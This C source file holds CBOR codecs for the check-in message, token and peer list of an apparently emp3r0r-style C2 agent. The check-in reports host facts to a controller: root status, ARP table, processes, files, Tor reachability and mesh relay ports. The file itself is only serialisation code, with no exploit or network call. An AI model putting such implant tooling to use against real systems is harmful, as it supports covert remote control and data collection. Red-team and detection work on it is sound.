/*
 * c2_agent_info.c — Emp3r0rAgent (check-in body), AgentToken and
 * EnrichedPeerList codecs.
 *
 * These are split from c2_messages.c because the check-in body is a wide
 * struct (43 keys) that a minimal agent fills in from host facts, while the
 * two tunnels envelopes are used on every single message.
 *
 * Decoding stays zero-copy (see c2_cbor_util.h): nested lists need caller
 * storage and a list that does not fit fails with C2_ERR_NOMEM instead of
 * truncating. The agent normally only *encodes* the check-in body; decode is
 * exercised by the round-trip tests and by a C2-side consumer.
 */

#include "c2_messages.h"

#include "c2_cbor_util.h"

#include "cbor.h"

#include <string.h>

/* A field is present when its pointer is set; a set string may be empty.
 * Lists are present when non-empty (an absent list and an empty list are
 * indistinguishable on the wire, and the C2 treats both as empty). */
#define AGENT_STR_SET(s) ((s).ptr != NULL)
#define AGENT_LIST_SET(l) ((l).count > 0)

/* ------------------------------------------------------------------------- */
/* AgentProcess                                                               */
/* ------------------------------------------------------------------------- */

static c2_status read_agent_process(CborValue *it, c2_agent_process *p) {
  if (cbor_value_is_null(it)) /* Go: nil *AgentProcess */
    return c2_cbor_dc(cbor_value_advance(it));
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_PROCESS_PID:
      st = c2_cbor_read_int(&map, &p->pid);
      p->has_pid = (st == C2_OK);
      break;
    case C2_KEY_PROCESS_PPID:
      st = c2_cbor_read_int(&map, &p->ppid);
      p->has_ppid = (st == C2_OK);
      break;
    case C2_KEY_PROCESS_CMDLINE:
      st = c2_cbor_read_text(&map, &p->cmdline);
      break;
    case C2_KEY_PROCESS_PARENT:
      st = c2_cbor_read_text(&map, &p->parent);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

static c2_status write_agent_process(CborEncoder *w, uint64_t key,
                                     const c2_agent_process *p) {
  size_t pairs = 0;
  if (p->has_pid)
    pairs++;
  if (p->has_ppid)
    pairs++;
  if (AGENT_STR_SET(p->cmdline))
    pairs++;
  if (AGENT_STR_SET(p->parent))
    pairs++;

  c2_status st = c2_cbor_write_key(w, key);
  if (st != C2_OK)
    return st;
  CborEncoder map;
  st = c2_cbor_ec(cbor_encoder_create_map(w, &map, pairs));
  if (st != C2_OK)
    return st;
  if (p->has_pid &&
      (st = c2_cbor_write_int(&map, C2_KEY_PROCESS_PID, p->pid)) != C2_OK)
    return st;
  if (p->has_ppid &&
      (st = c2_cbor_write_int(&map, C2_KEY_PROCESS_PPID, p->ppid)) != C2_OK)
    return st;
  if (AGENT_STR_SET(p->cmdline) &&
      (st = c2_cbor_write_text(&map, C2_KEY_PROCESS_CMDLINE, p->cmdline)) !=
          C2_OK)
    return st;
  if (AGENT_STR_SET(p->parent) &&
      (st = c2_cbor_write_text(&map, C2_KEY_PROCESS_PARENT, p->parent)) !=
          C2_OK)
    return st;
  return c2_cbor_ec(cbor_encoder_close_container(w, &map));
}

static int agent_process_set(const c2_agent_process *p) {
  return p->has_pid || p->has_ppid || AGENT_STR_SET(p->cmdline) ||
         AGENT_STR_SET(p->parent);
}

/* ------------------------------------------------------------------------- */
/* Emp3r0rAgent                                                               */
/* ------------------------------------------------------------------------- */

c2_status c2_agent_info_encode(CborEncoder *w, const c2_agent_info *a) {
  if (w == NULL || a == NULL)
    return C2_ERR_ARG;

  size_t pairs = 0;
#define COUNT_STR(f)                                                           \
  do {                                                                         \
    if (AGENT_STR_SET(a->f))                                                   \
      pairs++;                                                                 \
  } while (0)
#define COUNT_LIST(f)                                                          \
  do {                                                                         \
    if (AGENT_LIST_SET(a->f))                                                  \
      pairs++;                                                                 \
  } while (0)
  COUNT_STR(tag);
  COUNT_STR(name);
  COUNT_STR(version);
  COUNT_STR(transport);
  COUNT_STR(hostname);
  COUNT_STR(hardware);
  COUNT_STR(container);
  COUNT_STR(cpu);
  COUNT_STR(gpu);
  COUNT_STR(mem);
  COUNT_STR(os);
  COUNT_STR(goos);
  COUNT_STR(kernel);
  COUNT_STR(arch);
  COUNT_STR(from);
  COUNT_LIST(ips);
  COUNT_LIST(arp);
  COUNT_STR(user);
  if (a->has_root)
    pairs++;
  if (a->has_tor)
    pairs++;
  if (a->has_internet)
    pairs++;
  if (a->has_ncsi)
    pairs++;
  if (agent_process_set(&a->process))
    pairs++;
  COUNT_LIST(exes);
  COUNT_STR(cwd);
  COUNT_STR(product);
  COUNT_STR(uuid);
  COUNT_STR(uuid_sig);
  COUNT_STR(public_key);
  COUNT_STR(c2host);
  COUNT_STR(uptime);
  COUNT_STR(groups);
  COUNT_STR(mesh_route);
  COUNT_STR(p2p_relay_port);
  COUNT_STR(mesh_gossip_port);
  COUNT_LIST(files);
  COUNT_STR(goarch);
  COUNT_STR(p2p_transport);
  COUNT_STR(owner);
#undef COUNT_STR
#undef COUNT_LIST

  CborEncoder map;
  c2_status st = c2_cbor_ec(cbor_encoder_create_map(w, &map, pairs));
  if (st != C2_OK)
    return st;

#define PUT_STR(key, f)                                                        \
  do {                                                                         \
    if (AGENT_STR_SET(a->f) &&                                                 \
        (st = c2_cbor_write_text(&map, (key), a->f)) != C2_OK)                 \
      return st;                                                               \
  } while (0)
#define PUT_LIST(key, f)                                                       \
  do {                                                                         \
    if (AGENT_LIST_SET(a->f) &&                                                \
        (st = c2_cbor_write_str_list(&map, (key), &a->f)) != C2_OK)            \
      return st;                                                               \
  } while (0)

  PUT_STR(C2_KEY_AGENT_TAG, tag);
  PUT_STR(C2_KEY_AGENT_NAME, name);
  PUT_STR(C2_KEY_AGENT_VERSION, version);
  PUT_STR(C2_KEY_AGENT_TRANSPORT, transport);
  PUT_STR(C2_KEY_AGENT_HOSTNAME, hostname);
  PUT_STR(C2_KEY_AGENT_HARDWARE, hardware);
  PUT_STR(C2_KEY_AGENT_CONTAINER, container);
  PUT_STR(C2_KEY_AGENT_CPU, cpu);
  PUT_STR(C2_KEY_AGENT_GPU, gpu);
  PUT_STR(C2_KEY_AGENT_MEM, mem);
  PUT_STR(C2_KEY_AGENT_OS, os);
  PUT_STR(C2_KEY_AGENT_GOOS, goos);
  PUT_STR(C2_KEY_AGENT_KERNEL, kernel);
  PUT_STR(C2_KEY_AGENT_ARCH, arch);
  PUT_STR(C2_KEY_AGENT_FROM, from);
  PUT_LIST(C2_KEY_AGENT_IPS, ips);
  PUT_LIST(C2_KEY_AGENT_ARP, arp);
  PUT_STR(C2_KEY_AGENT_USER, user);
  if (a->has_root &&
      (st = c2_cbor_write_bool(&map, C2_KEY_AGENT_HAS_ROOT, a->root)) != C2_OK)
    return st;
  if (a->has_tor &&
      (st = c2_cbor_write_bool(&map, C2_KEY_AGENT_HAS_TOR, a->tor)) != C2_OK)
    return st;
  if (a->has_internet &&
      (st = c2_cbor_write_bool(&map, C2_KEY_AGENT_HAS_INTERNET, a->internet)) !=
          C2_OK)
    return st;
  if (a->has_ncsi &&
      (st = c2_cbor_write_bool(&map, C2_KEY_AGENT_NCSI_ENABLED, a->ncsi)) !=
          C2_OK)
    return st;
  if (agent_process_set(&a->process) &&
      (st = write_agent_process(&map, C2_KEY_AGENT_PROCESS, &a->process)) !=
          C2_OK)
    return st;
  PUT_LIST(C2_KEY_AGENT_EXES, exes);
  PUT_STR(C2_KEY_AGENT_CWD, cwd);
  PUT_STR(C2_KEY_AGENT_PRODUCT, product);
  PUT_STR(C2_KEY_AGENT_UUID, uuid);
  PUT_STR(C2_KEY_AGENT_UUID_SIG, uuid_sig);
  PUT_STR(C2_KEY_AGENT_PUBLIC_KEY, public_key);
  PUT_STR(C2_KEY_AGENT_C2HOST, c2host);
  PUT_STR(C2_KEY_AGENT_UPTIME, uptime);
  PUT_STR(C2_KEY_AGENT_GROUPS, groups);
  PUT_STR(C2_KEY_AGENT_MESH_ROUTE, mesh_route);
  PUT_STR(C2_KEY_AGENT_P2P_RELAY_PORT, p2p_relay_port);
  PUT_STR(C2_KEY_AGENT_MESH_GOSSIP_PORT, mesh_gossip_port);
  PUT_LIST(C2_KEY_AGENT_FILES, files);
  PUT_STR(C2_KEY_AGENT_GOARCH, goarch);
  PUT_STR(C2_KEY_AGENT_P2P_TRANSPORT, p2p_transport);
  PUT_STR(C2_KEY_AGENT_OWNER, owner);
#undef PUT_STR
#undef PUT_LIST

  return c2_cbor_ec(cbor_encoder_close_container(w, &map));
}

c2_status c2_agent_info_decode(CborValue *r, c2_agent_info *a) {
  if (r == NULL || a == NULL)
    return C2_ERR_ARG;

  CborValue map;
  c2_status st = c2_cbor_map_enter(r, &map);
  if (st != C2_OK)
    return st;

  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_AGENT_TAG:
      st = c2_cbor_read_text(&map, &a->tag);
      break;
    case C2_KEY_AGENT_NAME:
      st = c2_cbor_read_text(&map, &a->name);
      break;
    case C2_KEY_AGENT_VERSION:
      st = c2_cbor_read_text(&map, &a->version);
      break;
    case C2_KEY_AGENT_TRANSPORT:
      st = c2_cbor_read_text(&map, &a->transport);
      break;
    case C2_KEY_AGENT_HOSTNAME:
      st = c2_cbor_read_text(&map, &a->hostname);
      break;
    case C2_KEY_AGENT_HARDWARE:
      st = c2_cbor_read_text(&map, &a->hardware);
      break;
    case C2_KEY_AGENT_CONTAINER:
      st = c2_cbor_read_text(&map, &a->container);
      break;
    case C2_KEY_AGENT_CPU:
      st = c2_cbor_read_text(&map, &a->cpu);
      break;
    case C2_KEY_AGENT_GPU:
      st = c2_cbor_read_text(&map, &a->gpu);
      break;
    case C2_KEY_AGENT_MEM:
      st = c2_cbor_read_text(&map, &a->mem);
      break;
    case C2_KEY_AGENT_OS:
      st = c2_cbor_read_text(&map, &a->os);
      break;
    case C2_KEY_AGENT_GOOS:
      st = c2_cbor_read_text(&map, &a->goos);
      break;
    case C2_KEY_AGENT_KERNEL:
      st = c2_cbor_read_text(&map, &a->kernel);
      break;
    case C2_KEY_AGENT_ARCH:
      st = c2_cbor_read_text(&map, &a->arch);
      break;
    case C2_KEY_AGENT_FROM:
      st = c2_cbor_read_text(&map, &a->from);
      break;
    case C2_KEY_AGENT_IPS:
      st = c2_cbor_read_str_list(&map, &a->ips);
      break;
    case C2_KEY_AGENT_ARP:
      st = c2_cbor_read_str_list(&map, &a->arp);
      break;
    case C2_KEY_AGENT_USER:
      st = c2_cbor_read_text(&map, &a->user);
      break;
    case C2_KEY_AGENT_HAS_ROOT:
      st = c2_cbor_read_bool(&map, &a->root);
      a->has_root = (st == C2_OK);
      break;
    case C2_KEY_AGENT_HAS_TOR:
      st = c2_cbor_read_bool(&map, &a->tor);
      a->has_tor = (st == C2_OK);
      break;
    case C2_KEY_AGENT_HAS_INTERNET:
      st = c2_cbor_read_bool(&map, &a->internet);
      a->has_internet = (st == C2_OK);
      break;
    case C2_KEY_AGENT_NCSI_ENABLED:
      st = c2_cbor_read_bool(&map, &a->ncsi);
      a->has_ncsi = (st == C2_OK);
      break;
    case C2_KEY_AGENT_PROCESS:
      st = read_agent_process(&map, &a->process);
      break;
    case C2_KEY_AGENT_EXES:
      st = c2_cbor_read_str_list(&map, &a->exes);
      break;
    case C2_KEY_AGENT_CWD:
      st = c2_cbor_read_text(&map, &a->cwd);
      break;
    case C2_KEY_AGENT_PRODUCT:
      st = c2_cbor_read_text(&map, &a->product);
      break;
    case C2_KEY_AGENT_UUID:
      st = c2_cbor_read_text(&map, &a->uuid);
      break;
    case C2_KEY_AGENT_UUID_SIG:
      st = c2_cbor_read_text(&map, &a->uuid_sig);
      break;
    case C2_KEY_AGENT_PUBLIC_KEY:
      st = c2_cbor_read_text(&map, &a->public_key);
      break;
    case C2_KEY_AGENT_C2HOST:
      st = c2_cbor_read_text(&map, &a->c2host);
      break;
    case C2_KEY_AGENT_UPTIME:
      st = c2_cbor_read_text(&map, &a->uptime);
      break;
    case C2_KEY_AGENT_GROUPS:
      st = c2_cbor_read_text(&map, &a->groups);
      break;
    case C2_KEY_AGENT_MESH_ROUTE:
      st = c2_cbor_read_text(&map, &a->mesh_route);
      break;
    case C2_KEY_AGENT_P2P_RELAY_PORT:
      st = c2_cbor_read_text(&map, &a->p2p_relay_port);
      break;
    case C2_KEY_AGENT_MESH_GOSSIP_PORT:
      st = c2_cbor_read_text(&map, &a->mesh_gossip_port);
      break;
    case C2_KEY_AGENT_FILES:
      st = c2_cbor_read_str_list(&map, &a->files);
      break;
    case C2_KEY_AGENT_GOARCH:
      st = c2_cbor_read_text(&map, &a->goarch);
      break;
    case C2_KEY_AGENT_P2P_TRANSPORT:
      st = c2_cbor_read_text(&map, &a->p2p_transport);
      break;
    case C2_KEY_AGENT_OWNER:
      st = c2_cbor_read_text(&map, &a->owner);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(r, &map));
}

/* ------------------------------------------------------------------------- */
/* AgentToken                                                                 */
/* ------------------------------------------------------------------------- */

c2_status c2_agent_token_decode(CborValue *r, c2_agent_token *t) {
  if (r == NULL || t == NULL)
    return C2_ERR_ARG;

  CborValue map;
  c2_status st = c2_cbor_map_enter(r, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_TOKEN_AGENT_ID:
      st = c2_cbor_read_text(&map, &t->agent_id);
      break;
    case C2_KEY_TOKEN_IP:
      st = c2_cbor_read_text(&map, &t->ip);
      break;
    case C2_KEY_TOKEN_CAPABILITY:
      st = c2_cbor_read_text(&map, &t->capability);
      break;
    case C2_KEY_TOKEN_EXPIRES_AT:
      st = c2_cbor_read_int(&map, &t->expires_at);
      break;
    case C2_KEY_TOKEN_SIGNATURE:
      st = c2_cbor_read_bytes(&map, &t->signature);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(r, &map));
}

/* ------------------------------------------------------------------------- */
/* EnrichedPeer / EnrichedPeerList                                            */
/* ------------------------------------------------------------------------- */

static c2_status read_enriched_peer(CborValue *it, c2_enriched_peer *p) {
  if (cbor_value_is_null(it))
    return c2_cbor_dc(cbor_value_advance(it));
  CborValue map;
  c2_status st = c2_cbor_map_enter(it, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_PEER_UUID:
      st = c2_cbor_read_text(&map, &p->uuid);
      break;
    case C2_KEY_PEER_IPS:
      st = c2_cbor_read_str_list(&map, &p->ips);
      break;
    case C2_KEY_PEER_FROM:
      st = c2_cbor_read_text(&map, &p->from);
      break;
    case C2_KEY_PEER_P2P_RELAY_PORT:
      st = c2_cbor_read_text(&map, &p->p2p_relay_port);
      break;
    case C2_KEY_PEER_MESH_GOSSIP_PORT:
      st = c2_cbor_read_text(&map, &p->mesh_gossip_port);
      break;
    case C2_KEY_PEER_FILES:
      st = c2_cbor_read_str_list(&map, &p->files);
      break;
    case C2_KEY_PEER_LAST_SEEN:
      st = c2_cbor_read_int(&map, &p->last_seen);
      break;
    case C2_KEY_PEER_P2P_TRANSPORT:
      st = c2_cbor_read_text(&map, &p->p2p_transport);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(it, &map));
}

c2_status c2_enriched_peer_list_decode(CborValue *r,
                                       c2_enriched_peer_list *l) {
  if (r == NULL || l == NULL)
    return C2_ERR_ARG;

  l->count = 0;
  CborValue map;
  c2_status st = c2_cbor_map_enter(r, &map);
  if (st != C2_OK)
    return st;
  int done;
  uint64_t key;
  while ((st = c2_cbor_map_key(&map, &key, &done)) == C2_OK && !done) {
    switch (key) {
    case C2_KEY_PEER_LIST_PEERS: {
      if (cbor_value_is_null(&map)) {
        st = c2_cbor_dc(cbor_value_advance(&map));
        break;
      }
      if (!cbor_value_is_array(&map))
        return C2_ERR_PROTO;
      CborValue arr;
      st = c2_cbor_dc(cbor_value_enter_container(&map, &arr));
      if (st != C2_OK)
        return st;
      while (!cbor_value_at_end(&arr)) {
        if (l->count >= l->cap)
          return C2_ERR_NOMEM;
        st = read_enriched_peer(&arr, &l->peers[l->count]);
        if (st != C2_OK)
          return st;
        l->count++;
      }
      st = c2_cbor_dc(cbor_value_leave_container(&map, &arr));
      break;
    }
    case C2_KEY_PEER_LIST_SIGNATURE:
      st = c2_cbor_read_bytes(&map, &l->signature);
      break;
    default:
      st = c2_cbor_map_skip(&map);
      break;
    }
    if (st != C2_OK)
      return st;
  }
  if (st != C2_OK)
    return st;
  return c2_cbor_dc(cbor_value_leave_container(r, &map));
}
